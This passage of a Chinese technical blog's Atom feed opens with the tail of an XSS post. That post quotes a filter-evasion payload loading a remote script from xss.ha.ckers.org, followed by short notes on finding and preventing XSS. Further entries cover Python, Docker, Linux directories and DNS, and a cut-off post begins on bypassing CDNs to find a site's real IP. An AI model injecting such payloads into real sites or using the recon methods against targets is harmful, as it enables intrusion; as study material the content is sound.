class="line">&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure><h1 id="XSS漏洞挖掘方法"><a href="#XSS漏洞挖掘方法" class="headerlink" title="XSS漏洞挖掘方法"></a>XSS漏洞挖掘方法</h1><h2 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h2><p>表单、url、留言板、个人信息等</p><h2 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h2><p>跟随输入数据流，查看是否直接输出。</p><h1 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h1><p>黑名单过滤输入、输出标记</p><p>使用HTML编码</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h1&gt;&lt;p&gt;相关链接：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/qq_36119192/articl
      
    
    </summary>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/categories/web/"/>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>python2.7安装mysql-python&amp;&amp;CentOS安装python3.7</title>
    <link href="https://xytk0x0.github.io/2019/12/16/python2-7%E5%AE%89%E8%A3%85mysql-python-CentOS%E5%AE%89%E8%A3%85python3-7/"/>
    <id>https://xytk0x0.github.io/2019/12/16/python2-7安装mysql-python-CentOS安装python3-7/</id>
    <published>2019-12-16T01:08:01.000Z</published>
    <updated>2019-12-16T01:32:23.214Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>整理环境安装的过程</p><h1 id="python2-7-9-安装Mysql-python"><a href="#python2-7-9-安装Mysql-python" class="headerlink" title="python2.7.9 安装Mysql-python"></a>python2.7.9 安装Mysql-python</h1><p>在ubuntu上换了几个环境，网上找到的方法也不太行，就先去Windows10上试一下。</p><h2 id="windows-10"><a href="#windows-10" class="headerlink" title="windows 10"></a>windows 10</h2><p>Windows 10 直接pip也会出错</p><p><a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/" target="_blank" rel="noopener">https://www.lfd.uci.edu/~gohlke/pythonlibs/</a> 下载MySQL_python-1.2.5-cp27-none-win_amd64.whl</p><p>将文件放入虚拟环境的Script文件夹中</p><p>pip install MySQL_python-1.2.5-cp27-none-win_amd64.whl</p><h2 id="ubuntu-16-04"><a href="#ubuntu-16-04" class="headerlink" title="ubuntu 16.04"></a>ubuntu 16.04</h2><p>将whl文件下载到虚拟环境文件夹下的/share/python-wheels/中</p><p>执行pip install MySQL_python-1.2.5-cp27-none-win_amd64.whl显示不能安装</p><p>执行pip install MySQL-python 竟然就可以了。。。。</p><h1 id="CentOS安装python3-7-0"><a href="#CentOS安装python3-7-0" class="headerlink" title="CentOS安装python3.7.0"></a>CentOS安装python3.7.0</h1><p>需要在root身份下安装</p><h2 id="安装编译相关工具"><a href="#安装编译相关工具" class="headerlink" title="安装编译相关工具"></a>安装编译相关工具</h2><blockquote><p>yum -y groupinstall “Development tools”<br>yum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gdbm-devel db4-devel libpcap-devel xz-devel<br>yum install libffi-devel -y</p></blockquote><h2 id="下载安装包解压"><a href="#下载安装包解压" class="headerlink" title="下载安装包解压"></a>下载安装包解压</h2><blockquote><p>cd #用户目录<br>wget <a href="https://www.python.org/ftp/python/3.7.0/Python-3.7.0.tar.xz" target="_blank" rel="noopener">https://www.python.org/ftp/python/3.7.0/Python-3.7.0.tar.xz</a><br>tar -xvJf  Python-3.7.0.tar.xz</p></blockquote><h2 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h2><blockquote><p>mkdir /usr/local/python3 #创建编译安装目录<br>cd Python-3.7.0<br>./configure –prefix=/usr/local/python3<br>make &amp;&amp; make install</p></blockquote><h2 id="创建软连接"><a href="#创建软连接" class="headerlink" title="创建软连接"></a>创建软连接</h2><blockquote><p>ln -s /usr/local/python3/bin/python3 /usr/local/bin/python3<br>ln -s /usr/local/python3/bin/pip3 /usr/local/bin/pip3</p></blockquote><h2 id="验证是否成功"><a href="#验证是否成功" class="headerlink" title="验证是否成功"></a>验证是否成功</h2><blockquote><p>python3 -V<br>pip3 -V</p></blockquote><h2 id="安装virtualenv"><a href="#安装virtualenv" class="headerlink" title="安装virtualenv"></a>安装virtualenv</h2><p>在pip3 install virtualenv之后，仍然没有virtualenv这个命令</p><p>原因是没有将路径添加到$PATH中</p><blockquote><p>find / -name ‘virtualenv.py’ 找到文件</p></blockquote><blockquote><p>vim /etc/profile</p></blockquote><p>将下面内容添加到文件的最下面</p><blockquote><p>PATH=$PATH:/usr/local/python3/bin</p></blockquote><p>使添加的内容生效</p><blockquote><p>source /etc/profile</p></blockquote><p>最后查看是否添加成功</p><blockquote><p>echo $PATH</p></blockquote><h1 id="相关的一个小问题"><a href="#相关的一个小问题" class="headerlink" title="相关的一个小问题"></a>相关的一个小问题</h1><p>CentOS安装pycharm时遇到的</p><p>下载压缩包解压出现如下错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[xytk0x0@localhost Downloads]$ tar -zxvf pycharm-community-2019.3.tar.gz /home/xytk0x0/</span><br><span class="line">tar: /home/xytk0x0: Not found in archive</span><br><span class="line">tar: Exiting with failure status due to previous errors</span><br></pre></td></tr></table></figure><blockquote><p>使用如下命令：<br>tar -zxvf pycharm-community-2019.3.tar.gz -C /home/xytk0x0/</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h1&gt;&lt;p&gt;整理环境安装的过程&lt;/p&gt;
&lt;h1 id=&quot;python2-7-9-安装Mysql-python&quot;&gt;&lt;a href=&quot;#py
      
    
    </summary>
    
    
      <category term="环境安装或问题解决办法" scheme="https://xytk0x0.github.io/categories/%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85%E6%88%96%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
    
      <category term="python" scheme="https://xytk0x0.github.io/categories/python/"/>
    
    
      <category term="环境安装或问题解决办法" scheme="https://xytk0x0.github.io/tags/%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85%E6%88%96%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
    
      <category term="python" scheme="https://xytk0x0.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>docker的使用</title>
    <link href="https://xytk0x0.github.io/2019/12/03/docker%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>https://xytk0x0.github.io/2019/12/03/docker的使用/</id>
    <published>2019-12-03T07:43:08.000Z</published>
    <updated>2019-12-05T13:20:55.066Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>稍微整理一下</p><p>相关链接：</p><p><a href="https://www.w3cschool.cn/docker/" target="_blank" rel="noopener">https://www.w3cschool.cn/docker/</a></p><h1 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h1><img src="/2019/12/03/docker的使用/14.png" title="xytk0x0"><h2 id="docker架构"><a href="#docker架构" class="headerlink" title="docker架构"></a>docker架构</h2><p>Docker 使用客户端-服务器 (C/S) 架构模式，使用远程API来管理和创建Docker容器。</p><p>Docker 容器通过 Docker 镜像来创建。</p><p>容器与镜像的关系类似于面向对象编程中的对象与类。</p><h2 id="dockerfile"><a href="#dockerfile" class="headerlink" title="dockerfile"></a>dockerfile</h2><p>Dockerfile 是用于表示创建一个镜像文件的过程。Dockerfile 是由一个一个的指令组成。</p><h2 id="docker-hub"><a href="#docker-hub" class="headerlink" title="docker hub"></a>docker hub</h2><p>docker hub是docker官方维护的镜像仓库</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="Ubantu安装"><a href="#Ubantu安装" class="headerlink" title="Ubantu安装"></a>Ubantu安装</h2><p>要求 Ubuntu 系统的内核版本高于 3.10</p><img src="/2019/12/03/docker的使用/0.png" title="xytk0x0"><blockquote><p>sudo apt-get update<br>安装   sudo apt-get install -y docker.io<br>运行   sudo service docker start</p></blockquote><h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><h2 id="hello-world"><a href="#hello-world" class="headerlink" title="hello world"></a>hello world</h2><blockquote><p>docker run ubuntu:15.10 /bin/echo “Hello world”</p></blockquote><p><strong>docker:</strong>Docker 的二进制执行文件</p><p><strong>run:</strong>与前面的 docker 组合来运行一个容器</p><p><strong>ubuntu:15.10</strong>指定要运行的镜像，Docker首先从本地主机上查找镜像是否存在，如果不存在，Docker 就会从镜像仓库 Docker Hub 下载公共镜像</p><p><strong>/bin/echo “Hello world”:</strong>在启动的容器里执行的命令</p><img src="/2019/12/03/docker的使用/1.png" title="xytk0x0"><h2 id="交互式"><a href="#交互式" class="headerlink" title="交互式"></a>交互式</h2><blockquote><p>docker run -i -t ubuntu:15.10 /bin/bash</p></blockquote><p><strong>-t:</strong>在新容器内指定一个伪终端或终端。</p><p><strong>-i:</strong>允许你对容器内的标准输入 (STDIN) 进行交互。</p><img src="/2019/12/03/docker的使用/2.png" title="xytk0x0"><h2 id="后台模式"><a href="#后台模式" class="headerlink" title="后台模式"></a>后台模式</h2><p>以进程的方式运行命令：</p><blockquote><p>docker run -d ubuntu:15.10 /bin/sh -c “while true; do echo hello world; sleep 1; done”</p></blockquote><img src="/2019/12/03/docker的使用/3.png" title="xytk0x0"><img src="/2019/12/03/docker的使用/4.png" title="xytk0x0"><h2 id="docker-search"><a href="#docker-search" class="headerlink" title="docker search"></a>docker search</h2><img src="/2019/12/03/docker的使用/9.png" title="xytk0x0"><h2 id="docker-images"><a href="#docker-images" class="headerlink" title="docker images"></a>docker images</h2><p>显示已有镜像</p><img src="/2019/12/03/docker的使用/7.png" title="xytk0x0"><p><strong>REPOSTITORY：</strong>表示镜像的仓库源</p><p><strong>TAG：</strong>镜像的标签</p><p><strong>IMAGE ID：</strong>镜像ID</p><p><strong>CREATED：</strong>镜像创建时间</p><p><strong>SIZE：</strong>镜像大小</p><h2 id="docker-ps"><a href="#docker-ps" class="headerlink" title="docker ps"></a>docker ps</h2><blockquote><p>docker ps  查看正在运行的容器<br>docker ps -a   查看所有容器(包括未运行的)</p></blockquote><img src="/2019/12/03/docker的使用/6.png" title="xytk0x0"><h2 id="docker-stop"><a href="#docker-stop" class="headerlink" title="docker stop"></a>docker stop</h2><blockquote><p>docker stop 容器ID/NAMES</p></blockquote><img src="/2019/12/03/docker的使用/5.png" title="xytk0x0"><h2 id="docker-rm"><a href="#docker-rm" class="headerlink" title="docker rm"></a>docker rm</h2><p>删除容器需要在停止容器之后</p><blockquote><p>docker rm container ID/names</p></blockquote><img src="/2019/12/03/docker的使用/8.png" title="xytk0x0"><h2 id="docker-pull"><a href="#docker-pull" class="headerlink" title="docker pull"></a>docker pull</h2><p>下载镜像</p><h2 id="docker-build"><a href="#docker-build" class="headerlink" title="docker build"></a>docker build</h2><p>使用dockerfile搭建镜像</p><p>docker build -t 镜像名称 .  # 后面的. 指的是当前文件夹 (其实是Dockerfile存放的文件夹)</p><h2 id="docker-run"><a href="#docker-run" class="headerlink" title="docker run"></a>docker run</h2><p>docker run -it -p 8088:8088 -p 8089:8089 -p 8090:9090 -v /root/soft/docker:/root/soft/docker -v /root/soft/dockertt:/root/soft/dockertt loen/rc /bin/bash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">命令的格式：</span><br><span class="line">Usage: docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</span><br><span class="line">-a, --attach=[] 登录容器（以docker run -d启动的容器）</span><br><span class="line">-c, --cpu-shares=0 设置容器CPU权重，在CPU共享场景使用</span><br><span class="line">--cap-add=[] 添加权限，权限清单详见：http://linux.die.net/man/7/capabilities</span><br><span class="line">--cap-drop=[] 删除权限，权限清单详见：http://linux.die.net/man/7/capabilities</span><br><span class="line">--cidfile=&quot;&quot; 运行容器后，在指定文件中写入容器PID值，一种典型的监控系统用法</span><br><span class="line">--cpuset=&quot;&quot; 设置容器可以使用哪些CPU，此参数可以用来容器独占CPU</span><br><span class="line">-d, --detach=false 指定容器运行于前台还是后台</span><br><span class="line">--device=[] 添加主机设备给容器，相当于设备直通</span><br><span class="line">--dns=[] 指定容器的dns服务器</span><br><span class="line">--dns-search=[] 指定容器的dns搜索域名，写入到容器的/etc/resolv.conf文件</span><br><span class="line">-e, --env=[] 指定环境变量，容器中可以使用该环境变量</span><br><span class="line">--entrypoint=&quot;&quot; 覆盖image的入口点</span><br><span class="line">--env-file=[] 指定环境变量文件，文件格式为每行一个环境变量</span><br><span class="line">--expose=[] 指定容器暴露的端口，即修改镜像的暴露端口</span><br><span class="line">-h, --hostname=&quot;&quot; 指定容器的主机名</span><br><span class="line">-i, --interactive=false 打开STDIN，用于控制台交互</span><br><span class="line">--link=[] 指定容器间的关联，使用其他容器的IP、env等信息</span><br><span class="line">--lxc-conf=[] 指定容器的配置文件，只有在指定--exec-driver=lxc时使用</span><br><span class="line">-m, --memory=&quot;&quot; 指定容器的内存上限</span><br><span class="line">--name=&quot;&quot; 指定容器名字，后续可以通过名字进行容器管理，links特性需要使用名字</span><br><span class="line">--net=&quot;bridge&quot; 容器网络设置，待详述</span><br><span class="line">-P, --publish-all=false 指定容器暴露的端口，待详述</span><br><span class="line">-p, --publish=[] 指定容器暴露的端口，待详述</span><br><span class="line">--privileged=false 指定容器是否为特权容器，特权容器拥有所有的capabilities</span><br><span class="line">--restart=&quot;&quot; 指定容器停止后的重启策略，待详述</span><br><span class="line">--rm=false 指定容器停止后自动删除容器(不支持以docker run -d启动的容器)</span><br><span class="line">--sig-proxy=true 设置由代理接受并处理信号，但是SIGCHLD、SIGSTOP和SIGKILL不能被代理</span><br><span class="line">-t, --tty=false 分配tty设备，该可以支持终端登录</span><br><span class="line">-u, --user=&quot;&quot; 指定容器的用户</span><br><span class="line">-v, --volume=[] 给容器挂载存储卷，挂载到容器的某个目录</span><br><span class="line">--volumes-from=[] 给容器挂载其他容器上的卷，挂载到容器的某个目录</span><br><span class="line">-w, --workdir=&quot;&quot; 指定容器的工作目录</span><br></pre></td></tr></table></figure><h2 id="docker-rmi"><a href="#docker-rmi" class="headerlink" title="docker rmi"></a>docker rmi</h2><p>删除镜像</p><h1 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h1><h2 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h2><img src="/2019/12/03/docker的使用/11.png" title="xytk0x0"><img src="/2019/12/03/docker的使用/10.png" title="xytk0x0"><img src="/2019/12/03/docker的使用/12.png" title="xytk0x0"><blockquote><p>mkdir -p ~/nginx/www ~/nginx/logs ~/nginx/conf 创建文件夹供挂载</p></blockquote><p>若直接执行<strong>docker run -p 80:80 –name xytk -v $PWD/www:/www -v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf -v $PWD/logs:/wwwlogs  -d nginx</strong>会导致错误。我遇到的原因，本地的~/nginx.conf是文件夹，但docker中的/etc/nginx/nginx.conf是文件，肯定不能进行挂载。</p><blockquote><p>执行顺序：<br>docker run -p 80:80 –name xytk -v $PWD/www:/www  -v $PWD/logs:/wwwlogs  -d nginx<br>docker exec -it mynginx /bin/bash  通过命令行找到docker中的nginx.conf<br>docker cp xytk:/etc/nginx/nginx.conf $PWD/conf/nginx.conf<br>docker stop xytk<br>docker rm xytk<br>docker run -p 80:80 –name xytk -v $PWD/www:/www -v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf -v $PWD/logs:/wwwlogs  -d nginx<br>使用浏览器判断是否成功安装</p></blockquote><img src="/2019/12/03/docker的使用/13.png" title="xytk0x0"><h1 id="异常及解决办法"><a href="#异常及解决办法" class="headerlink" title="异常及解决办法"></a>异常及解决办法</h1><h2 id="下载速度慢"><a href="#下载速度慢" class="headerlink" title="下载速度慢"></a>下载速度慢</h2><p>在/etc/docker中创建daemon.json文件，将以下语句写入并重启。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   &quot;registry-mirrors&quot; : [&quot;https://docker.mirrors.ustc.edu.cn&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>国内的下载源：</p><blockquote><p>中科大：<a href="https://docker.mirrors.ustc.edu.cn" target="_blank" rel="noopener">https://docker.mirrors.ustc.edu.cn</a></p></blockquote><h2 id="docker-Got-permission-denied"><a href="#docker-Got-permission-denied" class="headerlink" title="docker: Got permission denied"></a>docker: Got permission denied</h2><img src="/2019/12/03/docker的使用/error0.png" title="xytk0x0"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The docker daemon binds to a Unix socket instead of a TCP port. By default that Unix socket is owned by the user root and other users can only access it using sudo. The docker daemon always runs as the root user.</span><br><span class="line">If you don’t want to use sudo when you use the docker command, create a Unix group called docker and add users to it. When the docker daemon starts, it makes the ownership of the Unix socket read/writable by the docker group.</span><br></pre></td></tr></table></figure><p>解决办法：</p><p>1、使用root权限执行命令。sudo + 命令</p><p>2、使用docker用户组中的数据</p><blockquote><p>sudo groupadd docker  应该会默认新建这个用户组<br>sudo gpasswd -a 用户名 用户组名<br>sudo newgrp 用户组名<br>docker ps 查看问题是否解决</p></blockquote><img src="/2019/12/03/docker的使用/error1.png" title="xytk0x0">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h1&gt;&lt;p&gt;稍微整理一下&lt;/p&gt;
&lt;p&gt;相关链接：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.w3cschool.cn/d
      
    
    </summary>
    
    
      <category term="docker" scheme="https://xytk0x0.github.io/categories/docker/"/>
    
    
      <category term="docker" scheme="https://xytk0x0.github.io/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>Linux根目录结构</title>
    <link href="https://xytk0x0.github.io/2019/11/18/Linux%E6%A0%B9%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84/"/>
    <id>https://xytk0x0.github.io/2019/11/18/Linux根目录结构/</id>
    <published>2019-11-18T01:52:05.000Z</published>
    <updated>2019-11-18T05:57:19.744Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前看过《鸟哥的Linux私房菜》这本书的大部分，但这些东西不常用就忘得差不多了，以后把用到的稍微整理一下。</p><h1 id="Linux根目录结构"><a href="#Linux根目录结构" class="headerlink" title="Linux根目录结构"></a>Linux根目录结构</h1><p>centos 7:</p><img src="/2019/11/18/Linux根目录结构/0.png" title="XYTK"><h2 id="bin目录"><a href="#bin目录" class="headerlink" title="bin目录"></a>bin目录</h2><p>此目录存放所有二进制命令（用户）</p><h2 id="boot目录"><a href="#boot目录" class="headerlink" title="boot目录"></a>boot目录</h2><p>Linux内核及引导系统程序所需的目录</p><h2 id="dev目录"><a href="#dev目录" class="headerlink" title="dev目录"></a>dev目录</h2><p>所有设备文件的目录（如声卡、磁盘、光驱）</p><h2 id="etc目录"><a href="#etc目录" class="headerlink" title="etc目录"></a>etc目录</h2><p>二进制安装包（yum，rpm）配置文件默认路径，服务启动命令存放目录</p><h2 id="home目录"><a href="#home目录" class="headerlink" title="home目录"></a>home目录</h2><p>普通用户的家目录默认数据存放目录</p><h2 id="lib、lib64目录"><a href="#lib、lib64目录" class="headerlink" title="lib、lib64目录"></a>lib、lib64目录</h2><p>库文件存放目录</p><h2 id="media"><a href="#media" class="headerlink" title="media"></a>media</h2><p>挂载可移动介质(media)，诸如CD、数码相机等用于挂载可移动设备的临时目录</p><h2 id="mnt目录"><a href="#mnt目录" class="headerlink" title="mnt目录"></a>mnt目录</h2><p>用于临时挂载存储设备</p><p>通常情况下可以挂载LINUX ISO光盘进行无网条件下的安装其他软件包</p><h2 id="opt目录"><a href="#opt目录" class="headerlink" title="opt目录"></a>opt目录</h2><p>自定义软件安装存放目录，用户自行安装的软件包存放目录。</p><h2 id="proc目录"><a href="#proc目录" class="headerlink" title="proc目录"></a>proc目录</h2><p>进程及内核信息存放目录</p><h2 id="root目录"><a href="#root目录" class="headerlink" title="root目录"></a>root目录</h2><p>root身份目录</p><h2 id="sbin目录"><a href="#sbin目录" class="headerlink" title="sbin目录"></a>sbin目录</h2><p>系统管理员命令存放的目录（超级管理员使用的命令）</p><h2 id="tmp目录"><a href="#tmp目录" class="headerlink" title="tmp目录"></a>tmp目录</h2><p>临时文件目录，程序运行时产生的临时文件存放目录</p><h2 id="usr目录"><a href="#usr目录" class="headerlink" title="usr目录"></a>usr目录</h2><p>系统存放程序的目录（命令和帮助文件）</p><p>其中usr/bin 用户可执行文件目录（应用程序）</p><p>/usr/sbin目录　　存放一些网络管理工具的软件目录</p><h2 id="var目录"><a href="#var目录" class="headerlink" title="var目录"></a>var目录</h2><p>存放内容常变动的文件目录</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;之前看过《鸟哥的Linux私房菜》这本书的大部分，但这些东西不常用就忘得差不多了，以后把用到的稍微整理一下。&lt;/p&gt;
&lt;h1 id=&quot;Lin
      
    
    </summary>
    
    
      <category term="linux" scheme="https://xytk0x0.github.io/categories/linux/"/>
    
    
      <category term="linux" scheme="https://xytk0x0.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>域名解析的记录类型</title>
    <link href="https://xytk0x0.github.io/2019/11/17/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E7%9A%84%E8%AE%B0%E5%BD%95%E7%B1%BB%E5%9E%8B/"/>
    <id>https://xytk0x0.github.io/2019/11/17/域名解析的记录类型/</id>
    <published>2019-11-17T07:54:40.000Z</published>
    <updated>2019-11-17T09:05:08.718Z</updated>
    
    <content type="html"><![CDATA[<h1 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>用户将域名提供给浏览器，通过域名解析能够找到对应的IP地址，通过IP地址找到服务器并返回资源。当然，在现在的复杂网络中，步骤要比这多得多。</p><p>域名解析指从域名到IP的解析过程。解析工作由DNS服务器完成。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>A记录、CNAME、MX记录、NS记录</p><h1 id="A记录"><a href="#A记录" class="headerlink" title="A记录"></a>A记录</h1><p>是最普通常见的域名解析，是把某一主机名解析到服务器IP。</p><p>AAAA：用来指定主机名（或域名）对应的IPv6地址。A记录对应的是IPV4地址。</p><h1 id="CNAME"><a href="#CNAME" class="headerlink" title="CNAME"></a>CNAME</h1><p>是主机名到主机名的映射，是把某一主机名解析到另一主机名。将空主机解析到别名aaaaa.com，访问该空主机的域名就会访问别名所解析到的IP。</p><h1 id="MX记录"><a href="#MX记录" class="headerlink" title="MX记录"></a>MX记录</h1><p>如果需要设置邮箱，让邮箱能收到邮件，就需要添加MX记录。主要是用于做企业邮箱使用。</p><p>邮件交换记录。用于将以该域名为结尾的电子邮件指向对应的邮件服务器以进行处理。如：用户所用的邮件是以域名mydomain.com为结尾的，则需要在管理界面中添加该域名的MX记录来处理所有以@mydomain.com结尾的邮件。</p><h1 id="NS记录"><a href="#NS记录" class="headerlink" title="NS记录"></a>NS记录</h1><p>域名服务器记录，如果需要把子域名交给其他DNS服务商解析，就需要添加NS记录。比如自己搭建DNS服务器的话也需要做NS记录将主机指向服务器。</p><p>解析服务器记录。用来表明由哪台服务器对该域名进行解析。这里的NS记录只对子域名生效。例如用户希望由12.34.56.78这台服务器解析news.mydomain.com，则需要设置news.mydomain.com的NS记录。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;域名解析&quot;&gt;&lt;a href=&quot;#域名解析&quot; class=&quot;headerlink&quot; title=&quot;域名解析&quot;&gt;&lt;/a&gt;域名解析&lt;/h1&gt;&lt;h2 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h
      
    
    </summary>
    
    
      <category term="网络" scheme="https://xytk0x0.github.io/categories/%E7%BD%91%E7%BB%9C/"/>
    
    
      <category term="网络" scheme="https://xytk0x0.github.io/tags/%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>绕过CDN的方法</title>
    <link href="https://xytk0x0.github.io/2019/11/13/%E7%BB%95%E8%BF%87CDN%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>https://xytk0x0.github.io/2019/11/13/绕过CDN的方法/</id>
    <published>2019-11-13T09:09:12.000Z</published>
    <updated>2019-11-17T07:21:28.351Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>相关链接： </p><p><a href="https://www.jianshu.com/p/ce98fbff39ac" target="_blank" rel="noopener">https://www.jianshu.com/p/ce98fbff39ac</a></p><p><a href="https://zhuanlan.zhihu.com/p/33440472" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/33440472</a></p><h1 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h1><p>CDN 全称是Content Delivery Network，即内容分发网络。</p><p>CDN是一组分布在多个不同的地理位置的WEB服务器，用于更加有效的向用户发布内容，在优化性能时，会根据距离的远近来选择。</p><p>CDN系统能实时的根据网络流量和各节点的连接，负载状况及用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上，其目的是使用户能就近的获取请求数据，解决网络拥堵，提高访问速度，解决由于网络带宽小，用户访问量大，网点分布不均等原因导致的访问速度慢的问题。</p><p>由于CDN部署在网络运营商的机房，这些运营商又是终端用户网络的提供商，因此用户请求的第一跳就到达CDN服务器，当CDN服务器中缓存有用户请求的数据时，就可以从CDN直接返回给浏览器，因此就可以提高访问速度。</p><p>CDN能够缓存JavaScript脚本，css样式表，图片，图标，Flash等静态资源文件（不包括html页面），这些静态资源文件的访问频率很高，将其缓存在CDN可以极大地提高网站的访问速度，但由于CDN是部署在网络运营商的机房，所以在一般的网站很少用CDN加速。</p><h2 id="分发的原理"><a href="#分发的原理" class="headerlink" title="分发的原理"></a>分发的原理</h2><p>用户向浏览器提供需要访问的域名；</p><p>浏览器调用域名解析库对域名进行解析，由于CDN对域名解析过程进行了调整，所以解析函数库一般得到的是该域名对应的CNAME记录，为了得到实际的IP地址，浏览器需要再次对获得的CNAME域名进行解析以得到实际的IP地址；在此过程中，使用的全局负载均衡DNS解析。如根据地理位置信息解析对应的IP地址，使得用户能就近访问；</p><p>此次解析得到CDN缓存服务器的IP地址，浏览器在得到实际的ip地址之后，向缓存服务器发出访问请求；</p><p>缓存服务器根据浏览器提供的要访问的域名，通过Cache内部专用DNS解析得到此域名的实际IP地址，再由缓存服务器向此实际IP地址提交访问请求；</p><p>缓存服务器从实际IP地址得到内容以后，一方面在本地进行保存，以备以后使用，二方面把获取的数据放回给客户端，完成数据服务过程；</p><p>客户端得到由缓存服务器返回的数据以后显示出来并完成整个浏览的数据请求过程。</p><h1 id="绕过CDN的方法"><a href="#绕过CDN的方法" class="headerlink" title="绕过CDN的方法"></a>绕过CDN的方法</h1><p><strong>绕过CDN的目的：找到网站的真实IP地址</strong></p><h2 id="判断IP是否为真实IP"><a href="#判断IP是否为真实IP" class="headerlink" title="判断IP是否为真实IP"></a>判断IP是否为真实IP</h2><h3 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h3><p>若域名解析结果为多个IP，则很有可能使用了CDN</p><h3 id="多地ping"><a href="#多地ping" class="headerlink" title="多地ping"></a>多地ping</h3><p>使用不同区域ping，查看ping的ip结果是否唯一。</p><blockquote><p>网站有：<br><a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a><br><a 